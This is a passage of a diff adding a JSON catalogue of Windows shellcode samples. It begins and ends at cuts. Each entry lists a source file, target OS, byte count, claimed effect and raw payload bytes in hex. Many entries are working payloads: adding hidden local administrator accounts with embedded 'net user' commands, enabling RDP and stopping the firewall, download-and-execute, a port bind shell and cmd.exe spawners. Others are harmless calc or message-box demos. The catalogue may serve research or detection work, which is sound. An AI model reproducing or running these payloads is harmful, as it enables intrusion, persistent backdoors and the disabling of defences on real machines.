35ba3633786931d151b97c130f2fba31524c6731d151b91b08352dba5849797231d151b9743a1e21ba2d65526e31d151b916101f17ba3458545231d151b92f270c6eba4e43684e31d151b939225e50ba4b47397031d15189e0bb41414101c1eb08c1eb08c1eb085350bba6b4022fba3352645931d3ffd331c050b841414165c1e808c1e808c1e80850b91e53393cba6d325b5031d151b904662f32ba61464b5b31d151b9191e0d11ba6973627531d151b920414736ba4535675931d151b92b05642aba4769445931d151b9103f4f22ba625a384331d151b92a6f2a24ba424f4c4d31d151b929091e5eba476c6a2d31d15189e0bb41414101c1eb08c1eb08c1eb085350bba6b4022fba3352645931d3ffd331c050b84141416fc1e808c1e808c1e80850b9722a0539ba524b704d31d151b9543a0552ba3548716f31d151b929160a47ba4c36793331d151b9271b5b3eba556d325d31d151b9331a3b10ba4177487531d151b934793a12ba53594e7731d151b91d5c1e28ba7232784131d151b92a4e5a28ba592d7a4b31d15189e0bb41414101c1eb08c1eb08c1eb085350bba6b4022fba3352645931d3ffd3bbf97e5e22ba36543d5431d3ffd3",
+    "claimed_effect": "Add Admin, enable RDP, stop firewall and start terminal service",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Add_Admin_User_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 194,
+    "bytes_hex": "31d2b230648b128b520c8b521c8b42088b72208b12807e0c3375f289c703783c8b577801c28b7a2001c731ed8b34af01c645813e57696e4575f28b7a2401c7668b2c6f8b7a1c01c78b7caffc01c7684b336e01682042726f682f414444686f727320687472617468696e6973682041646d68726f75706863616c676874206c6f6826206e656844442026686e202f4168726f4b3368336e20426842726f4b68736572206865742075682f63206e686578652068636d642e89e5fe4d5331c05055ffd7",
+    "claimed_effect": "Add Admin User Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Allwin_MessageBoxA.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 238,
+    "bytes_hex": "fc33d2b23064ff325a8b520c8b52148b722833c9b11833ff33c0ac3c617c022c20c1cf0d03f8e2f081ff5bbc4a6a8b5a108b1275da8b533c03d3ff72348b527803d38b722003f333c941ad03c381384765745075f4817804726f634175eb8178086464726575e2498b722403f3668b0c4e8b721c03f38b148e03d35233ff576861727941684c696272684c6f61645453ffd2683332010166897c2402687573657254ffd0686f7841018bdf885c24036861676542684d6573735450ff54242c57684f5f6f218bdc57535357ffd068657373018bdf885c24036850726f63684578697454ff742440ff54244057ffd0",
+    "claimed_effect": "Allwin MessageBoxA",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Allwin_WinExec_add_new_local_administrator_+_ExitProcess_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 272,
+    "bytes_hex": "fc33d2b23064ff325a8b520c8b52148b722833c9b11833ff33c0ac3c617c022c20c1cf0d03f8e2f081ff5bbc4a6a8b5a108b1275da8b533c03d3ff72348b527803d38b722003f333c941ad03c381384765745075f4817804726f634175eb8178086464726575e2498b722403f3668b0c4e8b721c03f38b148e03d3526878656301fe4c24036857696e455453ffd26a05eb23ffd068657373018bdffe4c24036850726f63684578697454ff74241cff54241c57ffd0e8d8ffffff636d642e657865202f63206e65742075736572205275626265724475636b206d756462617468202f616464202626206e6574206c6f63616c67726f75702061646d746f7273205275626265724475636b202f61646400",
+    "claimed_effect": "Allwin WinExec add new local administrator + ExitProcess Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Allwin_WinExec_cmd.exe_+_ExitProcess_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 195,
+    "bytes_hex": "fc33d2b23064ff325a8b520c8b52148b722833c9b11833ff33c0ac3c617c022c20c1cf0d03f8e2f081ff5bbc4a6a8b5a108b1275da8b533c03d3ff72348b527803d38b722003f333c941ad03c381384765745075f4817804726f634175eb8178086464726575e2498b722403f3668b0c4e8b721c03f38b148e03d3526878656301fe4c24036857696e455453ffd268636d6401fe4c24036a0533c98d4c240451ffd068657373018bdffe4c24036850726f63684578697454ff742420ff54242057ffd0",
+    "claimed_effect": "Allwin WinExec cmd.exe + ExitProcess Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Beep_Shellcode_(SP1-SP2).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 35,
+    "bytes_hex": "5589e583ec18c745fc10c9ea77c7442404e8030000c70424e80300008b45fcffd0c9c3",
+    "claimed_effect": "Beep Shellcode (SP1-SP2)",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Bind_Shell_(NT-XP-2000-2003).c",
+    "bucket": "asm",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Bind Shell (NT-XP-2000-2003)",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/Create_Admin_User_Account_(NT-XP-2000).c",
+    "bucket": "asm",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Create Admin User Account (NT-XP-2000)",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/Download_and_Execute_Shellcode_Generator.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Download and Execute Shellcode Generator",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/IsDebuggerPresent_ShellCode_(NT-XP).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 39,
+    "bytes_hex": "eb0f588030954081386861636b75f4eb05e8ecfffffff134a5959595ab53d59795566861636bcd",
+    "claimed_effect": "IsDebuggerPresent ShellCode (NT-XP)",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/PEB!NtGlobalFlags_shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 14,
+    "bytes_hex": "6a70585633346464337630394668",
+    "claimed_effect": "PEB!NtGlobalFlags shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/PEB_Kernel32.dll_ImageBase_Finder.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 49,
+    "bytes_hex": "6a30583430505050643340305e56344c34405e56333056585e3450344c3330585056585e333056585e3458345033305658",
+    "claimed_effect": "PEB Kernel32.dll ImageBase Finder",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/PEB_Kernel32.dll_ImageBase_Finder_Alphanumeric.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 67,
+    "bytes_hex": "6a305834305056545936333164334630346d346133305658565459363331563450344c3330585056585654593633315633305658565459363331563458345033305658",
+    "claimed_effect": "PEB Kernel32.dll ImageBase Finder Alphanumeric",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/PEB_method_(9x-NT-2k-XP).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 31,
+    "bytes_hex": "6a3059648b0985c9780c8b490c8b711cad8b4808eb098b49348b497c8b493c",
+    "claimed_effect": "PEB method (9x-NT-2k-XP)",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Pop_up_message_box_(XP-SP2).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 19,
+    "bytes_hex": "31c031db31c931d2eb375988510abb771d807c",
+    "claimed_effect": "Pop up message box (XP-SP2)",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Reverse_Generic_Shellcode_w-o_Loader.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Reverse Generic Shellcode w-o Loader",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/SP2_english_(_calc.exe_).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 38,
+    "bytes_hex": "eb165b31c05053bb8d15867cffd331c050bbeacd817cffd3e8e5ffffff63616c632e65786500",
+    "claimed_effect": "SP2 english ( calc.exe )",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/SP3_english_(_calc.exe_).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 38,
+    "bytes_hex": "eb165b31c05053bb0d25867cffd331c050bb12cb817cffd3e8e5ffffff63616c632e65786500",
+    "claimed_effect": "SP3 english ( calc.exe )",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Safari_JS_JITed_shellcode.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Safari JS JITed shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/Shellcode_(cmd.exe)_for_XP_SP2_Turkish.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 26,
+    "bytes_hex": "8bec558bec686578652f68636d642e8d45f850b8c793c177ffd0",
+    "claimed_effect": "Shellcode (cmd.exe) for XP SP2 Turkish",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Shellcode_(cmd.exe)_for_XP_SP3_English.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 26,
+    "bytes_hex": "8bec558bec686578652f68636d642e8d45f850b8c793c277ffd0",
+    "claimed_effect": "Shellcode (cmd.exe) for XP SP3 English",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Shellcode_Checksum_Routine.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Shellcode Checksum Routine",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/Shellcode_Collection.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 19,
+    "bytes_hex": "eb02bac793bf77ffd2cce8f3ffffff63616c63",
+    "claimed_effect": "Shellcode Collection",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Vampiric_Import_Reverse_Connect.c",
+    "bucket": "asm",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Vampiric Import Reverse Connect",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/Vista-7-2008.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Vista-7-2008",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/WinExec()_Command_Parameter.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "WinExec() Command Parameter",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/Write-to-file_Shellcode.c",
+    "bucket": "asm",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Write-to-file Shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/XP-sp1_portshell_on_port_58821.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 116,
+    "bytes_hex": "83c4ec33c05050506a066a016a02b8015aab71ffd08bd833c08945f4b002668945f066c745f2e5c56a108d55f05253b8ce3eab71ffd06a0153b8e25dab71ffd033c0505053b88d86ab71ffd08bd8ba1d20e877536af6ffd2536af5ffd2536af4ffd2c745fb41636d648d45fc50b84480c277ffd0",
+    "claimed_effect": "XP-sp1 portshell on port 58821",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP-sp2_(EN)_cmd.exe.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 23,
+    "bytes_hex": "8bec686578652068636d642e8d45f850b88d15867cffd0",
+    "claimed_effect": "XP-sp2 (EN) cmd.exe",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_PRO_SP3.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 428,
+    "bytes_hex": "b14f977cf910477e27fa877c433a5c57494e444f0418807c8a20877c8a20877c8a20877ce502887c57535c7338d6467e8a20877c8a20877c8a20877c8a20877c8a20877ce502887c79737465cbbe457e8a20877c8a20877c8a20877c8a20877c8a20877ce502887c63616c6331a9917c8a20877c8a20877c8a20877c8a20877c073d967c073d967c073d967c073d967ce502887c6d33325ccbbe457e8a20877c8a20877c8a20877c8a20877c8a20877ce502887c2e65786531a9917c8a20877c8a20877c8a20877c8a20877c073d967c073d967c073d967c073d967c9e2e927c31a9917c8a20877c8a20877c8a20877c8a20877cee4c977cee4c977cee4c977cee4c977cee4c977cee4c977cee4c977cee4c977ce502887c7aebc36f4fda857c8a20877c8a20877c8a20877c8a20877c32d9447e6228977c8a20877c6228977c8a20877c6228977c8a20877c6228977c8a20877cd6d1957c8a20877c8a20877c8a20877c3380977c3380977c3380977c3380977cf5d6917c073d967cd6d1957c8a20877c8a20877c8a20877cb14f977ced2a867ce7c1877c8a20877c8a20877c8a20877c8a20877c8a20877c",
+    "claimed_effect": "XP PRO SP3",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_Pro_Sp2_English_Message-Box_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 16,
+    "bytes_hex": "b938dd827c33c0bbd80a867c5150ffd3",
+    "claimed_effect": "XP Pro Sp2 English Message-Box Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_Pro_Sp2_English_Wordpad_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 15,
+    "bytes_hex": "6a0568974c807cb84d11867cffd0cc",
+    "claimed_effect": "XP Pro Sp2 English Wordpad Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_Professional_SP2_ita_calc.exe.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 37,
+    "bytes_hex": "eb165b31c05053bb8d15867cffd331c050bbeacd817cffd3e8e5ffffff63616c632e657865",
+    "claimed_effect": "XP Professional SP2 ita calc.exe",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_SP3_EN_Calc_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 16,
+    "bytes_hex": "31c9516863616c6354b8c793c277ffd0",
+    "claimed_effect": "XP SP3 EN Calc Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_SP3_English_MessageBoxA.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 87,
+    "bytes_hex": "31c031db31c931d251686c6c20206833322e64687573657289e1bb7b1d807c51ffd3b95e6730ef81c111111111516861676542684d65737389e15150bb40ae807cffd389e131d252515152ffd031c050b812cb817cffd0",
+    "claimed_effect": "XP SP3 English MessageBoxA",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_SP3_addFirewallRule.c",
+    "bucket": "asm",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "XP SP3 addFirewallRule",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/XP_download_and_exec_source.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "XP download and exec source",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/XP_sp2_(FR)_Sellcode_cmd.exe.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 32,
+    "bytes_hex": "8bec33ff57c645fc63c645fd6dc645fe64c645f8018d45fc50b8c793bf77ffd0",
+    "claimed_effect": "XP sp2 (FR) Sellcode cmd.exe",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/XP_sp3_(Ru)_WinExec+ExitProcess_cmd_shellcode.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "XP sp3 (Ru) WinExec+ExitProcess cmd shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/Xp_Pro_SP3_Fr_(calc.exe).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 31,
+    "bytes_hex": "eb105b53bbad23867cffd3bbfaca817cffd3e8ebffffff63616c632e657865",
+    "claimed_effect": "Xp Pro SP3 Fr (calc.exe)",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/add_new_local_administrator.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 326,
+    "bytes_hex": "daded97424f4b822d2277a29c9b14b5b31431a83ebfc034316e2d73bbc7a17bc954bd7d892ece7a56594082d25699d41badc2ae1caf725e2ca07bea2fe8a805e74d43cc149b5b79169124c2c4ed106aad6e44c3f6cff1b1a51fef078a5498d4b4d487f82ae7abf19fcf9ff96fac0305b040425903df69d7137e756db93e683ba50e418c83de99f254a1514b8a59f6e9f29c1ad720153d9275dace6b1a5d2dccaa9d4dc4b6ed0dc4b71e0123e97d142d857d69243a95c9c0d8e83d370c24c13731bc4f69b432907a4fd171cb9a01a9f3ad4d4de82ee16e00407a01ffb2826d15fe679bd0cf72f3982c780beb1cfc8adc52ff74e57b426f5df5117da7cba3941f79ab0fa92a81a8f392e2e06a680f0b5168f9b65782e3801a696e6e9c8b392c978533868edcccc05986211b806ee3854ae83ceda51104068e1f8ede9668c7895584e5434fdeaaa",
+    "claimed_effect": "add new local administrator",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/connectback,_receive,_save_and_execute_shellcode.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "connectback, receive, save and execute shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/download_&_exec_shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 202,
+    "bytes_hex": "eb548b753c8b74357803f5568b762003f533c94941ad33db360fbe142838f27408c1cb0d03da40ebef3bdf75e75e8b5e2403dd668b0c4b8b5e1c03dd8b048b03c5c375726c6d6f6e2e646c6c00433a5c552e6578650033c064034030780c8b400c8b701cad8b4008eb098b40348d407c8b403c95bf8e4e0eece884ffffff83ec04832c243cffd09550bf361a2f70e86fffffff8b5424fc8d52ba33db535352eb2453ffd05dbf98fe8a0ee853ffffff83ec04832c2462ffd0bf7ed8e273e840ffffff52ffd0e8d7ffffff",
+    "claimed_effect": "download & exec shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/download_and_execute.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "download and execute",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/eggsearch_shellcode.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "eggsearch shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/null-free_32-bit_Windows_download_and_LoadLibrary_shellcode.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "null-free 32-bit Windows download and LoadLibrary shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/null-free_32-bit_Windows_shellcode_that_executes_calc.exe.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "null-free 32-bit Windows shellcode that executes calc.exe",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/null-free_32-bit_Windows_shellcode_that_shows_a_message_box.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "null-free 32-bit Windows shellcode that shows a message box",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/null-free_bindshell_for_Windows_5.0-6.0_all_service_packs.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "null-free bindshell for Windows 5.0-6.0 all service packs",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/pro_sp3_(EN).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 113,
+    "bytes_hex": "eb165b31c05053bbad23867cffd331c050bbfaca817cffd3e8e5ffffff636d642e657865202f63206e657420757365722073656375696430206d306e6b202f616464202626206e6574206c6f63616c67726f75702061646d696e6973747261746f72732073656375696430202f61646400",
+    "claimed_effect": "pro sp3 (EN)",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/sp2_(En_+_Ar)_cmd.exe.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 23,
+    "bytes_hex": "8bec686578652068636d642e8d45f850b88d15867cffd0",
+    "claimed_effect": "sp2 (En + Ar) cmd.exe",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/sp3_(FR)_Sleep.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 14,
+    "bytes_hex": "31c0b94624807c66b8905f50ffd1",
+    "claimed_effect": "sp3 (FR) Sleep",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/sp3_(Tr)_Add_Admin_Account_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 127,
+    "bytes_hex": "eb1b5b31c05031c088435d53bbad23867cffd331c050bbfaca817cffd3e8e0ffffff636d642e657865202f63206e65742075736572207a726c20313233343536202f616464202626206e6574206c6f63616c67726f75702041646d696e6973747261746f7273202f616464207a726c202626206e65742075736572207a726c",
+    "claimed_effect": "sp3 (Tr) Add Admin Account Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/sp3_(Tr)_MessageBoxA_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 109,
+    "bytes_hex": "31c031db31d931d2eb355988510abb7b1d807c51ffd3eb375931d288510b5150bb30ae807cffd3eb375931d288510752525152ffd031d250b8faca817cffd0e8c6ffffff7573657233322e646c6c4ee8c4ffffff4d657373616765426f78414ee8c4ffffff697473206f6b21ff",
+    "claimed_effect": "sp3 (Tr) MessageBoxA Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/sp3_(Tr)_calc.exe_Shellcode_53_bytes.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 53,
+    "bytes_hex": "eb1b5b31c05031c088431353bbad23867cffd331c050bbfaca817cffd3e8e0ffffff636d642e657865202f632063616c632e657865",
+    "claimed_effect": "sp3 (Tr) calc.exe Shellcode 53 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/sp3_(Tr)_cmd.exe_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 42,
+    "bytes_hex": "31c0eb135b88430e53bbad23867cffd3bbfaca817cffd3e8e8ffffff636d642e657865202f6320636d64",
+    "claimed_effect": "sp3 (Tr) cmd.exe Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/sp3_(Tr)_cmd.exe_Shellcode_52_bytes.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 52,
+    "bytes_hex": "eb1b5b31c05031c088431253bbad23867cffd331c050bbfaca817cffd3e8e0ffffff636d642e657865202f6320636d642e657865",
+    "claimed_effect": "sp3 (Tr) cmd.exe Shellcode 52 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/telnetbind_by_winexec.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "telnetbind by winexec",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/useradd_shellcode_for_russian_systems.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "useradd shellcode for russian systems",
+    "supported": false
+  },
+  {
+    "source_file": "Windows/win32-PerfectXp-pc1-sp3_(Tr)_Add_Admin_Shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 112,
+    "bytes_hex": "eb1b5b31c05031c088434e53bb0d25867cffd331c050bb12cb817cffd3e8e0ffffff636d642e657865202f63206e65742075736572206b707373203132333435202f616464202626206e6574206c6f63616c67726f75702041646d696e6973747261746f7273202f616464206b707373",
+    "claimed_effect": "win32-PerfectXp-pc1-sp3 (Tr) Add Admin Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/win32-xp_pro_sp3_MessageBox_shellcode.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 11,
+    "bytes_hex": "33d252525252e8bee9447d",
+    "claimed_effect": "win32-xp pro sp3 MessageBox shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/xp_pro_sp3_(calc).c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 57,
+    "bytes_hex": "b8ffeffffff7d02be0558bec33ff5783ec04c645f863c645f96dc645fa64c645fb2ec645fc65c645fd78c645fe658d45f850bbc793bf77ffd3",
+    "claimed_effect": "xp pro sp3 (calc)",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/xp_sp2_PEB_ISbeingdebugged_shellcode.c",
+    "bucket": "other",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "xp sp2 PEB ISbeingdebugged shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Windows-64/(URLDownloadToFileA)_download_and_execute.c",
+    "bucket": "other",
+    "os": "Windows-64",
+    "arch": null,
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "(URLDownloadToFileA) download and execute",
+    "supported": false
+  },
+  {
+    "source_file": "Windows-64/Add_Admin,_enable_RDP,_stop_firewall_and_start_terminal_service.c",
+    "bucket": "hex",
+    "os": "Windows-64",
+    "arch": null,
+    "byte_count": 1218,
+    "bytes_hex": "31c050b841414164c1e808c1e808c1e80850b96d765352ba4d59323631d151b96e726171ba4e332d3831d151b96c757878ba4c34343131d151b946475746ba3334323431d151b956504764ba3835334431d15189e0bb41414101c1eb08c1eb08c1eb085350bbdc7aa823ba4d56365531d3ffd331c050684141646458c1e808c1e80850b901416032ba48614f5331d151b928470d2fba5b674c6331d151b903243621ba6250595331d151b934411518ba5d32616a31d151b90c051b25ba6868724b31d151b92f277b13ba5a575b5231d151b91c2c023eba704b705131d151b93d2a324cba5145512d31d151b9235c1c19ba4d39683931d15189e0bb41414101c1eb08c1eb08c1eb085350bbdc7aa823ba4d56365531d3ffd331c050684141646458c1e808c1e80850b902636b35ba4b43445431d151b961556c3dba43752d7131d151b9273f3b1aba545a496931d151b925341267ba4a44323231d151b90b021f19ba6e71746d31d151b9393f7b15ba4d5a5b5131d151b93515032aba67706e4531d151b93a177546ba6f47556431d151b926350b1eba6a72595131d151b92a2a062aba6665456b31d151b91d20355aba5365617a31d15189e0bb41414101c1eb08c1eb08c1eb085350bbdc7aa823ba4d56365531d3ffd331c050b9094c7c5eba386c533831d151b9424d3914ba62625d3431d151b97a242675ba2d6b743131d151b91d301528ba58774a6c31d151b97c2f5716ba535b774431d151b942252a66ba2d4b594631d151b9282f0c5aba4d4c783331d151b9202b2626ba6344484831d151b9082b2367ba6652773431d151b9491c2e48ba697a6a2d31d151b967671d37ba4547324131d151b903330d3bba7145684931d151b9396a3c2fba554a6f4a31d151b937441f2eba5a2d714f31d151b93423233bba6877464931d151b9073a0a14ba7348657831d151b9142e5853ba486d373d31d151b93e3d2632ba526e434631d151b9333c3534ba5d48475b31d151b9360e072bba587a444431d151b93c100a37ba4962785231d151b9247c3b36ba6131677531d151b9313d3b27ba6264687331d151b97f7d3d35ba3633786931d151b97c130f2fba31524c6731d151b91b08352dba5849797231d151b9743a1e21ba2d65526e31d151b916101f17ba3458545231d151b92f270c6eba4e43684e31d151b939225e50ba4b47397031d15189e0bb41414101c1eb08c1eb08c1eb085350bbdc7aa823ba4d56365531d3ffd331c050b841414165c1e808c1e808c1e80850b91e53393cba6d325b5031d151b904662f32ba61464b5b31d151b9191e0d11ba6973627531d151b920414736ba4535675931d151b92b05642aba4769445931d151b9103f4f22ba625a384331d151b92a6f2a24ba424f4c4d31d151b929091e5eba476c6a2d31d15189e0bb41414101c1eb08c1eb08c1eb085350bbdc7aa823ba4d56365531d3ffd331c050b84141416fc1e808c1e808c1e80850b9722a0539ba524b704d31d151b9543a0552ba3548716f31d151b929160a47ba4c36793331d151b9271b5b3eba556d325d31d151b9331a3b10ba4177487531d151b934793a12ba53594e7731d151b91d5c1e28ba7232784131d151b92a4e5a28ba592d7a4b31d15189e0bb41414101c1eb08c1eb08c1eb085350bbdc7aa823ba4d56365531d3ffd3bb9b4fd030ba6336464631d3ffd3",
+    "claimed_effect": "Add Admin, enable RDP, stop firewall and start terminal service",
+    "supported": true
+  },
+  {
+    "source_file": "Windows-64/Obfuscated_Shellcode_x86-x64_Download_And_Execute_[Use_PowerShell].c",
+    "bucket": "hex",
+    "os": "Windows-64",
+    "arch": null,
+    "byte_count": 555,
